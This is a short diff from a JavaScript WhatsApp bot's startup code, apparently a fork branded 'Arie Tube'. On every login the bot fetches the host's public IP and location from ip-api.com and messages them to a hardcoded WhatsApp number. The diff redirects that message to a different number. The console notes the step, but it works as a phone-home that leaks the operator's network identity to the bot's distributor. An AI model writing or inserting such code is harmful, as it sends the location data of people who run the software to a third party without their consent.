@@ -44,7 +44,7 @@ arietube.autoReconnect = ReconnectMode.onConnectionLost
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       arietube.sendMessage("6288245009287@s.whatsapp.net", `─────「 *LOGIN BERHASIL BANG ARIE TUBE* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Arie Tube",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/arietube.jpg'),sourceUrl:"https://wa.me/6288245009287?text=Assalamualaikum"}}})
+       arietube.sendMessage("6285828357727@s.whatsapp.net", `─────「 *LOGIN BERHASIL BANG ARIE TUBE* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Arie Tube",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/arietube.jpg'),sourceUrl:"https://wa.me/6285828357727?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
       
